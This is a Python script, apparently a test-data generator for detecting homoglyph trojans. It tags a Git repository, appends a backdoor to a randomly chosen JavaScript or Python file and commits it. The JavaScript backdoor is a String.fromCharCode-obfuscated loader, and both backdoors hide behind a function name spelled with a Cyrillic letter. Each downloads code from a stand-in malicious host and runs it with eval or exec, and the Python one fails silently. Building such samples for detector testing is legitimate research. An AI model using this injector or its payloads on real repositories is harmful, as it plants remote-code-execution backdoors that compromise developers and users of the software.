import git
import os
import random

def inject_hut_vulnerability(repo_path: str, file_extension: str = ".js", filters: list = None) -> str:
    """
    Performs local manipulations on a Git repository to inject a HUT (Hidden Unicode Trojan) vulnerability.
    This script simulates a homoglyph attack.

    The process is as follows:
    0. Checks if the latest tag is "TEST". If so, it assumes the manipulation has already been done
       and returns the path of the file that was modified.
    1. Assigns the "PRE-TEST" tag to the latest commit if it doesn't already have a tag.
       This marks the state before the backdoor injection.
    2. Selects a random file with the specified extension and injects a malicious function
       at the end of it. The function name uses a homoglyph (e.g., a Cyrillic 'a' instead of a Latin 'a')
       to appear legitimate. A call to this malicious function is also added.
    3. Commits the changes with the message "Adding test HUT backdoor".
    4. Assigns the "TEST" tag to the new commit, marking the compromised version.

    Args:
        repo_path (str): The path to the local Git repository.
        file_extension (str): The extension of files to consider for injection (e.g., ".py", ".js").
                              The script has predefined payloads for these two.
        filters (list): A list of directory names to ignore during file search (e.g., [".git", "node_modules"]).
                        If None, a default list will be used.

    Returns:
        str: The absolute path of the modified file, or None if an error occurs.
    """
    if filters is None:
        filters = ['.git', 'node_modules', 'dist', 'build']

    # --- Payloads for different languages ---
    # The payload for JS is obfuscated using String.fromCharCode to simulate a real-world scenario.
    js_code_to_obfuscate = "var https = require('https'); https.get('https://www.fakemaliciouswebsite.it/fake-vulnerability-download', res => { res.on('data', chunk => { eval(chunk.toString()); }); });"
    js_char_codes = ','.join(str(ord(c)) for c in js_code_to_obfuscate)

    payloads = {
        ".js": f"""
// --- INJECTED HUT BACKDOOR (Homoglyph Attack) ---
// The function name 'validаte_input' below contains a Cyrillic 'а' (U+0430)
// which is visually indistinguishable from the Latin 'a' (U+0061).
function validаte_input(data) {{
    // This obfuscated payload downloads and executes code from a remote server.
    eval(String.fromCharCode({js_char_codes}));
}}

// Calling the malicious function to activate the backdoor.
validаte_input("user_data");
// --- END OF INJECTED CODE ---
""",
        ".py": """
# --- INJECTED HUT BACKDOOR (Homoglyph Attack) ---
# The function name 'validаte_input' below contains a Cyrillic 'а' (U+0430)
# which is visually indistinguishable from the Latin 'a' (U+0061).
def validаte_input(data):
    try:
        import urllib.request
        # The following line downloads and executes code from a remote URL.
        exec(urllib.request.urlopen('https://www.fakemaliciouswebsite.it/fake-vulnerability-py').read())
    except Exception:
        pass # The attack fails silently if there's an error.

# Calling the malicious function to activate the backdoor.
validаte_input("user_data")
# --- END OF INJECTED CODE ---
"""
    }

    if file_extension not in payloads:
        print(f"Error: No HUT payload is defined for file extension '{file_extension}'.")
        return None
    
    fake_vulnerability = payloads[file_extension]

    # --- Open and validate the repository ---
    try:
        repo = git.Repo(repo_path)
        # It's good practice to ensure we are not on a detached HEAD before starting.
        if repo.head.is_detached:
            print("Warning: Repository is in a 'detached HEAD' state. Attempting to checkout 'master' or 'main'.")
            if 'master' in repo.branches:
                repo.git.checkout('master')
            elif 'main' in repo.branches:
                repo.git.checkout('main')
            else:
                print("Could not find 'master' or 'main' branch to check out.")
                return None
        
        repo.git.checkout(repo.head.commit)

        # --- 0. Check if the 'TEST' tag already exists ---
        tags = sorted(repo.tags, key=lambda t: t.commit.authored_datetime)
        if tags and tags[-1].name == "TEST":
            print("Latest tag is 'TEST'. Repository seems to be already manipulated.")
            last_tag = tags[-1]
            # Find the file modified between PRE-TEST and TEST tags
            try:
                pre_test_commit = repo.commit("PRE-TEST")
                diffs = last_tag.commit.diff(pre_test_commit)
                if diffs:
                    modified_file = diffs[0].a_path
                    print(f"File modified in the 'TEST' commit: {modified_file}")
                    return os.path.join(repo_path, modified_file)
            except git.BadName:
                 print("Could not find 'PRE-TEST' tag to determine modified file.")            
            return None

    except (git.InvalidGitRepositoryError, git.NoSuchPathError) as e:
        print(f"Error opening repository at '{repo_path}': {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred while opening the repository: {e}")
        return None

    # --- 1. Assign 'PRE-TEST' tag to the current HEAD ---
    head_commit = repo.head.commit
    if not any(tag.commit.hexsha == head_commit.hexsha for tag in repo.tags):
        try:
            repo.create_tag("PRE-TEST", ref=head_commit)
            print(f"Tag 'PRE-TEST' assigned to the current commit ({head_commit.hexsha[:7]}).")
        except Exception as e:
            print(f"Error while creating the 'PRE-TEST' tag: {e}")
    else:
        print(f"The current commit ({head_commit.hexsha[:7]}) is already tagged. Skipping 'PRE-TEST' assignment.")


    # --- 2. Select a random file and inject the backdoor ---
    eligible_files = []
    for root, dirs, files in os.walk(repo_path):
        # Filter out directories to ignore
        dirs[:] = [d for d in dirs if d not in filters]
        for file_name in files:
            if file_name.endswith(file_extension):
                eligible_files.append(os.path.join(root, file_name))

    if not eligible_files:
        print(f"No files with extension '{file_extension}' found in the repository (outside ignored directories).")
        return None

    random_file_path = random.choice(eligible_files)
    print(f"\nRandomly selected file for modification: {random_file_path}")

    try:
        with open(random_file_path, 'a', encoding='utf-8') as f:
            f.write('\n' + fake_vulnerability + '\n')
        print(f"HUT backdoor appended to file: {random_file_path}")
    except Exception as e:
        print(f"Error while writing to file {random_file_path}: {e}")
        return None

    # --- 3. Commit the changes ---
    try:
        rel_file_path = os.path.relpath(random_file_path, repo.working_tree_dir)
        repo.index.add([rel_file_path])
        new_commit = repo.index.commit("Adding test HUT backdoor")
        print(f"Commit performed. Hash: {new_commit.hexsha[:7]}")
    except Exception as e:
        print(f"Error during commit: {e}")
        return None

    # --- 4. Assign the "TEST" tag to the new commit ---
    try:
        repo.create_tag("TEST", ref=new_commit)
        print(f"Tag 'TEST' assigned to the new commit ({new_commit.hexsha[:7]}).")
    except Exception as e:
        print(f"Error while creating the 'TEST' tag: {e}")

    print("\nHUT injection process completed successfully.")
    return random_file_path